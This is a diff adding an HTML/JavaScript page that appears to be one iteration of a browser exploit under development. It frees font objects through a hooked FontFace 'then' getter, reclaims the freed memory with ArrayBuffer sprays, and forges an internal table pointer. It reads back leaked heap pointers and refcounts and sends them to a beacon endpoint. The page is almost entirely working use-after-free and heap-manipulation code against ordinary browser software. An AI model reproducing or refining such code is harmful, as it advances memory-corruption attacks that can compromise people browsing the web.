@@ -1,0 +1,225 @@
+<!--
+  p656k: one-reload readback — cobrajet Issue #241 §2 (W slot-frame) + §3 (rc walk-vs-add)
+
+  Base: p656b two-phase forge (bench-proven: addClient consumes forged m_table
+  at +0x58 without validation; engine writes a heap ptr at +0x68; rc seed+1).
+
+  NEW in k:
+    K1 (§2 slot-frame audit): phase-2 buffer seeded ALL-ZERO except +0x58=T1.
+        After the adopt continuation, dump the full engine write-map:
+        dwords +0x50..+0x94 + status-byte candidates (+0x82, +0x85).
+        Pre-registered branches (cobrajet §2):
+          (a) +0x68==0 AND +0x78==0      -> W2 landed in T1 bucket (table frame)
+          (b) W2 at +0x68 (and +0x78==0) -> wrapper@+0x68, NDEBUG-arm offset
+          (c) W2 at +0x78 (and +0x68==0) -> device map stands, label fix
+        Same dump on the PHASE-1 buffer (fresh-table baseline write-map).
+    K2 (§3 rc timeline): sample +0x00 (rc dword) IDLE at 0/250/600ms with NO
+        fonts/style/layout ops in between, then after ONE fonts.check, then
+        after ONE fonts.load. First op that shows seed+1 owns the bump.
+        (walk-ref law: iterateClients/forEach Ref() entries; add alone must not)
+
+  Beacon: P656K-.
+  CRASH_CLASS: HIGH (same as p656b; buffer identical size/content class).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656k</title></head>
+<body>p656k: forge readback + rc timeline
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656K-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+/* dump dwords off..off+len (4-byte steps) as "off:hi_lo" pairs, 4 per line */
+function dumpRegion(tag, dv, off, end) {
+  var line = '';
+  var n = 0;
+  for (var o = off; o < end; o += 4) {
+    var lo = dv.getUint32(o, true);
+    if (n > 0) line += ' ';
+    line += o.toString(16) + ':' + hex32(lo);
+    n++;
+    if (n === 4) { emit(tag, line); line = ''; n = 0; }
+  }
+  if (n > 0) emit(tag, line);
+}
+
+emit('START', 'k-readback');
+flush();
+
+var phase = 0;
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var sty2 = null;
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      /* P1 spray: everything zero except rc seed (+0x00=2) and marker */
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=' + bufs1.length + ' clean-zero');
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      /* P2 spray: ALL-ZERO except rc seed (+0x00=5), marker, and +0x58=T1.
+         Any other nonzero byte after continuation = engine write. */
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 5, true);
+        dv.setUint32(0x04, 0xBBBB0002, true);
+        dv.setUint32(0x58, T1_lo, true);
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=' + bufs2.length + ' zero-except-T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0x58, true) !== 0 || bufs1[i].dv.getUint32(0x5C, true) !== 0) { hit1 = i; break; }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'no reclaim'); flush(); return; }
+
+  var dv1 = bufs1[hit1].dv;
+  var rc1 = dv1.getUint32(0x00, true);
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  var W1_lo = dv1.getUint32(0x68, true);
+  var W1_hi = dv1.getUint32(0x6C, true);
+
+  emit('P1-HIT', 'hit=' + hit1 + ' rc=' + rc1);
+  emit('P1-TW', 'T1=' + hex32(T1_hi) + hex32(T1_lo) + ' W1=' + hex32(W1_hi) + hex32(W1_lo));
+  /* K1 baseline: fresh-table write-map (engine wrote into an all-zero buffer) */
+  dumpRegion('P1-MAP', dv1, 0x50, 0x94);
+  emit('P1-BYTES', 'st82=0x' + dv1.getUint8(0x82).toString(16) + ' st85=0x' + dv1.getUint8(0x85).toString(16));
+
+  if (T1_lo === 0 && T1_hi === 0) { emit('P1-FAIL', 'T1 null'); flush(); return; }
+  flush();
+
+  sty2 = document.createElement('style');
+  sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+  document.head.appendChild(sty2);
+
+  var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+  document.fonts.add(ffB);
+  void ffB.loaded;
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+  emit('P2-TRIGGER', 'sent');
+  flush();
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    /* hit = any buffer with an engine write OUTSIDE our seeds:
+       scan +0x60..+0x94 and +0x08..0x50 for nonzero (skip 0x00/0x04/0x58/0x5C seeds) */
+    for (var i = 0; i < bufs2.length; i++) {
+      var d = bufs2[i].dv, dirty = false;
+      for (var o = 0x08; o < 0x50; o += 4) if (d.getUint32(o, true) !== 0) { dirty = true; break; }
+      if (!dirty) for (var o = 0x60; o < 0xC0; o += 4) if (d.getUint32(o, true) !== 0) { dirty = true; break; }
+      if (dirty) { hit2 = i; break; }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'no engine write outside seeds'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0x00, true);
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' (seed 5)');
+
+    /* K1: full write-map of the forge continuation */
+    var f58l = dv2.getUint32(0x58, true), f58h = dv2.getUint32(0x5C, true);
+    var w68l = dv2.getUint32(0x68, true), w68h = dv2.getUint32(0x6C, true);
+    var w78l = dv2.getUint32(0x78, true), w78h = dv2.getUint32(0x7C, true);
+    emit('P2-KEY', 'f58=' + hex32(f58h) + hex32(f58l) +
+         ' w68=' + hex32(w68h) + hex32(w68l) +
+         ' w78=' + hex32(w78h) + hex32(w78l));
+    dumpRegion('P2-MAP', dv2, 0x50, 0x94);
+    emit('P2-BYTES', 'st82=0x' + dv2.getUint8(0x82).toString(16) + ' st85=0x' + dv2.getUint8(0x85).toString(16));
+
+    /* pre-registered verdict */
+    var w68nz = (w68l !== 0 || w68h !== 0);
+    var w78nz = (w78l !== 0 || w78h !== 0);
+    var forgeHeld = (f58l === T1_lo && f58h === T1_hi);
+    if (!forgeHeld) emit('VERDICT', 'FORGE-FAILED f58!=T1');
+    else if (w68nz && !w78nz) emit('VERDICT', 'BRANCH-B wrapper@+0x68 (NDEBUG arm)');
+    else if (w78nz && !w68nz) emit('VERDICT', 'BRANCH-C wrapper@+0x78 (device map stands)');
+    else if (!w68nz && !w78nz) emit('VERDICT', 'BRANCH-A no face-slot W (table bucket landing)');
+    else emit('VERDICT', 'BRANCH-DUAL both +0x68 and +0x78 written (new)');
+
+    /* K2: rc timeline — IDLE samples, then one check, then one load */
+    var idle = 0;
+    (function rcSample() {
+      emit('RC-IDLE' + idle, 'rc=' + dv2.getUint32(0x00, true));
+      flush();
+      idle++;
+      if (idle < 3) { setTimeout(rcSample, 250); return; }
+      try { document.fonts.check('1em sb'); } catch(e) {}
+      emit('RC-CHECK', 'rc=' + dv2.getUint32(0x00, true));
+      flush();
+      document.fonts.load('1em sb', 'CD').then(function(){}, function(){});
+      setTimeout(function() {
+        emit('RC-LOAD', 'rc=' + dv2.getUint32(0x00, true));
+        /* P1 buffer integrity re-check */
+        emit('P1-POST', 'rc1=' + dv1.getUint32(0x00, true) +
+             ' f58=' + hex32(dv1.getUint32(0x5C, true)) + hex32(dv1.getUint32(0x58, true)));
+        emit('ALIVE', 'end');
+        flush();
+      }, 300);
+    })();
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,200)); flush(); }
+  }, 200);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,200)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
